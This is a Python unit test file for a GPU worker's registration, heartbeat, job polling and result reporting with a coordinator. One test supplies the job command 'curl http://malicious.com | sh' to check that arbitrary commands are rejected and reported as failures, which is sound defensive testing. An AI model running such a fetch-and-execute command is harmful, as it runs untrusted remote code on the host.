"""
Comprehensive unit and integration tests for Worker lifecycle and Coordinator API contract:
  - Registration and peer UUID retention
  - Registration retry with bounded exponential backoff
  - Heartbeat and telemetry reporting
  - Job polling (200 OK vs 204 No Content)
  - Polling network error resiliency
  - Marking claimed job RUNNING
  - Safe workload execution and exit_code reporting
  - Unsupported workload rejection/failure reporting
  - Graceful shutdown and deregistration
"""

from __future__ import annotations

import unittest
from unittest.mock import MagicMock, call, patch

from worker.config import WorkerConfig
from worker.coordinator.client import (
    CoordinatorClient,
    JobPollError,
    RegistrationError,
)
from worker.executor.cuda_executor import CUDAExecutor, CUDAResult, UnsupportedWorkloadError
from worker.executor.job_handler import JobHandler, JobResult, JobStatus
from worker.gpu.detector import GPUDetector, GPUInfo, GPUTelemetry
from worker.state import WorkerState, WorkerStateMachine
from worker.worker import Worker


def _sample_gpu_info() -> GPUInfo:
    return GPUInfo(
        gpu_id=0,
        name="NVIDIA RTX 3050",
        uuid="GPU-1234-5678",
        total_vram_mib=4096,
        driver_version="550.54",
        cuda_available=True,
    )


def _sample_telemetry(free_vram: int = 3500) -> GPUTelemetry:
    return GPUTelemetry(
        gpu_id=0,
        name="NVIDIA RTX 3050",
        uuid="GPU-1234-5678",
        total_vram_mib=4096,
        free_vram_mib=free_vram,
        used_vram_mib=4096 - free_vram,
        gpu_utilization_pct=15.0,
        temperature_c=48.0,
        driver_version="550.54",
        cuda_available=True,
    )


class TestWorkerRegistrationAndIdentity(unittest.TestCase):
    """Verifies that the worker registers and retains the canonical peer UUID."""

    def test_registration_retains_coordinator_peer_uuid(self):
        config = WorkerConfig(
            coordinator_url="http://localhost:8000",
            worker_id="local-worker-1",
            gpu_id=0,
            heartbeat_interval=60,
            poll_interval=1.0,
        )
        worker = Worker(config)

        # Mock detector
        detector = MagicMock(spec=GPUDetector)
        detector.detect.return_value = _sample_gpu_info()
        detector.telemetry.return_value = _sample_telemetry()
        worker._detector = detector

        # Mock coordinator client
        coordinator = MagicMock(spec=CoordinatorClient)
        assigned_uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"

        def fake_register(gpu_info):
            coordinator.peer_id = assigned_uuid
            return {"id": assigned_uuid, "registered": True}

        coordinator.register.side_effect = fake_register
        coordinator.peer_id = None
        coordinator.poll_next_job.return_value = None
        worker._coordinator = coordinator

        worker.start()

        coordinator.register.assert_called_once_with(_sample_gpu_info())
        self.assertEqual(worker.peer_id, assigned_uuid)
        self.assertEqual(worker._sm.state, WorkerState.AVAILABLE)

        worker.stop()
        coordinator.deregister.assert_called_once()

    def test_registration_retries_with_backoff_and_succeeds(self):
        config = WorkerConfig(
            coordinator_url="http://localhost:8000",
            worker_id="local-worker-retry",
            gpu_id=0,
            heartbeat_interval=60,
        )
        worker = Worker(config)

        detector = MagicMock(spec=GPUDetector)
        detector.detect.return_value = _sample_gpu_info()
        worker._detector = detector

        coordinator = MagicMock(spec=CoordinatorClient)
        # Fail first attempt, succeed second attempt
        assigned_uuid = "b2c3d4e5-f6a7-8901-bcde-f12345678901"
        attempts = 0

        def flaky_register(gpu_info):
            nonlocal attempts
            attempts += 1
            if attempts == 1:
                raise RegistrationError("Connection refused by coordinator")
            coordinator.peer_id = assigned_uuid
            return {"id": assigned_uuid}

        coordinator.register.side_effect = flaky_register
        coordinator.poll_next_job.return_value = None
        worker._coordinator = coordinator

        worker.start()
        self.assertEqual(attempts, 2)
        self.assertEqual(worker.peer_id, assigned_uuid)
        worker.stop()

    def test_registration_fails_after_max_attempts(self):
        config = WorkerConfig(
            coordinator_url="http://localhost:8000",
            worker_id="local-worker-fail",
            gpu_id=0,
            heartbeat_interval=60,
        )
        worker = Worker(config)

        detector = MagicMock(spec=GPUDetector)
        detector.detect.return_value = _sample_gpu_info()
        worker._detector = detector

        coordinator = MagicMock(spec=CoordinatorClient)
        coordinator.register.side_effect = RegistrationError("Coordinator down")
        worker._coordinator = coordinator

        with self.assertRaises(RegistrationError):
            worker.start()

        self.assertEqual(worker._sm.state, WorkerState.ERROR)
        worker.stop()


class TestWorkerJobPollingAndExecution(unittest.TestCase):
    """Verifies polling, status marking, execution, and result submission."""

    def setUp(self):
        self.config = WorkerConfig(
            coordinator_url="http://localhost:8000",
            worker_id="worker-test",
            gpu_id=0,
            poll_interval=0.1,
            heartbeat_interval=60,
        )
        self.assigned_uuid = "11111111-2222-3333-4444-555555555555"

    def _build_started_worker(self):
        worker = Worker(self.config)

        detector = MagicMock(spec=GPUDetector)
        detector.detect.return_value = _sample_gpu_info()
        detector.telemetry.return_value = _sample_telemetry()
        worker._detector = detector

        coordinator = MagicMock(spec=CoordinatorClient)
        coordinator.peer_id = self.assigned_uuid
        coordinator.poll_next_job.return_value = None
        worker._coordinator = coordinator

        executor = MagicMock(spec=CUDAExecutor)
        executor.execute.return_value = CUDAResult(
            workload_type="matrix_multiply",
            device="cuda:0",
            execution_time_s=0.25,
            output={"matrix_dim": 1024, "result_shape": [1024, 1024]},
            success=True,
        )
        worker._executor = executor

        worker.start()
        return worker, coordinator, executor

    def test_empty_job_poll_204_does_not_execute(self):
        worker, coordinator, executor = self._build_started_worker()
        coordinator.poll_next_job.return_value = None  # HTTP 204

        # Run single poll invocation directly
        result = worker._poll_and_execute_next_job()

        self.assertIsNone(result)
        executor.execute.assert_not_called()
        self.assertEqual(worker._sm.state, WorkerState.AVAILABLE)
        worker.stop()

    def test_poll_error_is_handled_gracefully(self):
        worker, coordinator, executor = self._build_started_worker()
        coordinator.poll_next_job.side_effect = JobPollError("Connection timeout")

        result = worker._poll_and_execute_next_job()

        self.assertIsNone(result)
        self.assertEqual(worker._sm.state, WorkerState.AVAILABLE)
        worker.stop()

    def test_claimed_coordinator_job_workflow(self):
        worker, coordinator, executor = self._build_started_worker()
        coordinator_job = {
            "id": "job-abc-123",
            "name": "MatMul Test",
            "command": "matrix_multiply",
            "vram_required_mb": 500,
            "requirements": {
                "workload_type": "matrix_multiply",
                "required_vram_mb": 500,
            },
            "status": "ASSIGNED",
        }
        coordinator.poll_next_job.return_value = coordinator_job

        result = worker._poll_and_execute_next_job()

        self.assertIsNotNone(result)
        self.assertEqual(result.status, JobStatus.SUCCESS)

        # 1. Marked RUNNING
        coordinator.update_job_status.assert_called_with(
            job_id="job-abc-123",
            status="RUNNING",
        )

        # 2. Executed workload
        executor.execute.assert_called_once()

        # 3. Reported result with exit_code: 0
        coordinator.post_job_result.assert_called_once()
        _, kwargs = coordinator.post_job_result.call_args
        self.assertEqual(kwargs["job_id"], "job-abc-123")
        payload = kwargs["result"]
        self.assertEqual(payload["status"], "success")
        self.assertEqual(payload["exit_code"], 0)
        self.assertEqual(payload["output"]["workload_type"], "matrix_multiply")
        self.assertIn("matrix_dim", payload["output"]["output"])

        # 4. Worker returns to AVAILABLE
        self.assertEqual(worker._sm.state, WorkerState.AVAILABLE)
        worker.stop()

    def test_claimed_unsupported_workload_fails_safely(self):
        worker, coordinator, executor = self._build_started_worker()
        executor.execute.side_effect = UnsupportedWorkloadError("Arbitrary commands disallowed")

        unsafe_job = {
            "id": "job-unsafe",
            "command": "curl http://malicious.com | sh",
            "vram_required_mb": 0,
            "status": "ASSIGNED",
        }
        coordinator.poll_next_job.return_value = unsafe_job

        result = worker._poll_and_execute_next_job()

        self.assertIsNotNone(result)
        self.assertEqual(result.status, JobStatus.FAILED)
        self.assertIn("Arbitrary commands disallowed", result.error)

        # Reported failure to coordinator with exit_code: 1
        coordinator.post_job_result.assert_called_once()
        _, kwargs = coordinator.post_job_result.call_args
        payload = kwargs["result"]
        self.assertEqual(payload["status"], "failed")
        self.assertEqual(payload["exit_code"], 1)

        # Worker recovers to AVAILABLE
        self.assertEqual(worker._sm.state, WorkerState.AVAILABLE)
        worker.stop()


if __name__ == "__main__":
    unittest.main()
